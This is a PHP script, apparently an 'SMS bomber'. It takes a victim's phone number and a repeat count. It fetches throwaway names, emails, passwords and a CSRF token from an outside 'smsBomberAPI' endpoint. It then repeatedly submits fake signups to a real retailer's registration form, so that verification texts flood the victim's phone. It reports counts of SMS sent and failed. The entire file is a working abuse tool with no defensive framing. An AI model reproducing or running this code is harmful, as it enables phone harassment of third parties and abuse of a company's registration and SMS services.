error_reporting(0);

header('Content-Type: application/json; charset=utf-8');

$fayujBasariiliSMSler = 0;

$fayujBasarisizSMSler = 0;



if(isset($_GET['fayujAdet']) && !empty(trim($_GET['fayujAdet']))) {

    $fayujAdet = htmlspecialchars($_GET['fayujAdet']);

} else {

    $fayujError = json_encode(array(

        'status' => false,

        "fayujMessage" => "'fayujAdet' verisi boş bırakılamaz!",

        "author" => "fayujxdev ♥ t.me/geceyesigara"

    ), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);

    echo $fayujError;

}



if(isset($_GET['fayujPhone']) && !empty(trim($_GET['fayujPhone']))) {

    $fayujPhone = htmlspecialchars($_GET['fayujPhone']);

    if(strlen($fayujPhone) == 10) {

        $fayujPhone = "0".$fayujPhone;

    } else {

        $fayujError = json_encode(array(

            'status' => false,

            "fayujMessage" => "Telefon 10 haneli olmalıdır!",

            "author" => "fayujxdev ♥ t.me/geceyesigara"

        ), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);

        echo $fayujError;

    }

} else {

    $fayujError = json_encode(array(

        'status' => false,

        "fayujMessage" => "'fayujPhone' verisi boş bırakılamaz!",

        "author" => "fayujxdev ♥ t.me/geceyesigara"

    ), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);

    echo $fayujError;

}

$fayujHeaderVeriCek = [

    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

    "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",

    "Cache-Control: max-age=0",

    "Cookie: PHPSESSID=9i7sh1ffl04dliq5eqsa05hlbs",

    "Sec-Ch-Ua: \"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",

    "Sec-Ch-Ua-Mobile: ?0",

    "Sec-Ch-Ua-Platform: \"Windows\"",

    "Sec-Fetch-Dest: document",

    "Sec-Fetch-Mode: navigate",

    "Sec-Fetch-Site: none",

    "Sec-Fetch-User: ?1",

    "Upgrade-Insecure-Requests: 1",

    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",

];



$fauyjUrlVeriCek = "https://api.fayuj.com.tr/smsBomberAPI.php?fayujxprompt=fayujxGetir";

$fayujChVeriCek = curl_init();

curl_setopt($fayujChVeriCek, CURLOPT_URL, $fauyjUrlVeriCek);

curl_setopt($fayujChVeriCek, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($fayujChVeriCek, CURLOPT_CUSTOMREQUEST, "GET");

curl_setopt($fayujChVeriCek, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($fayujChVeriCek, CURLOPT_SSL_VERIFYPEER, 0);

$fayujRespVericek = curl_exec($fayujChVeriCek);

$fayujRespVericek = json_decode($fayujRespVericek, true);

$fayujSucKontrol = $fayujRespVericek['fayujxSuccess'];

if (isset($fayujSucKontrol) && $fayujSucKontrol == "true") {

    $fayujAdFinal = $fayujRespVericek['fayujxAdi'];

    $fayujSoyadFinal = $fayujRespVericek['fayujxSoyadi'];

    $fayujEpostaFinal = $fayujRespVericek['fayujxEposta'];

    $fayujxPass = $fayujRespVericek['fayujxPass'];

    $fayujxPostToken = $fayujRespVericek['fayujxPostToken'];

} else {

    $fayujError = json_encode(array(

        'status' => false,

        "fayujMessage" => "API'de sorun var :/",

        "author" => "fayujxdev ♥ t.me/geceyesigara"

    ), JSON_UNESCAPED_UNICODE || JSON_PRETTY_PRINT);

    echo $fayujError;

}



for ($fayuji = 0; $fayuji < $fayujAdet; $fayuji++) {

    $fayujUrlEnglishHome = "https://www.englishhome.com/enh_app/users/registration/";

    $fayujPostEnglishHome = "csrfmiddlewaretoken=$fayujxPostToken&first_name=$fayujAdFinal&last_name=$fayujSoyadFinal&email=$fayujEpostaFinal&phone=$fayujPhone&password=$fayujxPass&confirm=true&sms_allowed=true&tom_pay_allowed=true";



    $fayujHeaderEnglishHome = [

        "Accept: */*",

        "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",

        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",

        "Cookie: csrftoken=mx2Yc4ivETUUqThqKHr7AimXb8j9L6Gri2nr2qht0YgremQ4EzET2JRlG9NjyCYz; ajs_group_id=null; ajs_user_id=%22None%22; ajs_anonymous_id=%222406f8a5-9c4d-45e9-85de-5cc10f11e06e%22; osessionid=a2dw0gpntc5gfmswjmk2g0hjsml972l2",

        "Origin: https://www.englishhome.com",

        "Referer: https://www.englishhome.com/register/?next=/hafta-sonuna-ozel/",

        "Sec-Ch-Ua: \"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",

        "Sec-Ch-Ua-Mobile: ?0",

        "Sec-Ch-Ua-Platform: \"Windows\"",

        "Sec-Fetch-Dest: empty",

        "Sec-Fetch-Mode: cors",

        "Sec-Fetch-Site: same-origin",

        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",

        "X-Csrftoken: ".$fayujxPostToken,

        "X-Requested-With: XMLHttpRequest",

    ];



    $fayujChEnglishHome = curl_init();

    curl_setopt($fayujChEnglishHome, CURLOPT_URL, $fayujUrlEnglishHome);

    curl_setopt($fayujChEnglishHome, CURLOPT_RETURNTRANSFER, 1);

    curl_setopt($fayujChEnglishHome, CURLOPT_POSTFIELDS, $fayujPostEnglishHome);

    curl_setopt($fayujChEnglishHome, CURLOPT_CUSTOMREQUEST, "POST");

    curl_setopt($fayujChEnglishHome, CURLOPT_POST, 1);

    curl_setopt($fayujChEnglishHome, CURLOPT_HTTPHEADER, $fayujHeaderEnglishHome);

    curl_setopt($fayujChEnglishHome, CURLOPT_SSL_VERIFYHOST, 0);

    curl_setopt($fayujChEnglishHome, CURLOPT_SSL_VERIFYPEER, 0);

    $fayujRespEnglishHome = curl_exec($fayujChEnglishHome);

    $fayujRespEnglishHome = json_decode($fayujRespEnglishHome, true);



    if (isset($fayujRespEnglishHome['confirm']) && $fayujRespEnglishHome['confirm'] === true) {

        $fayujBasariiliSMSler++;

        $fayujReason = "English Home";

    } else {

        $fayujBasarisizSMSler++;

        $fayujReason = "English Home";

    }

    sleep(3);

}



$fayujSonResponse = json_encode(array(

    "fayujStatus" => true,

    "fayujFirma" => $fayujReason,

    "fayujGonderilenSMSler" => $fayujBasariiliSMSler,

    "fayujGonderilmeyenSMSler" => $fayujBasarisizSMSler,

    "author" => "fayujxdev ♥ t.me/geceyesigara"

), JSON_UNESCAPED_UNICODE || JSON_PRETTY_PRINT);

echo $fayujSonResponse;

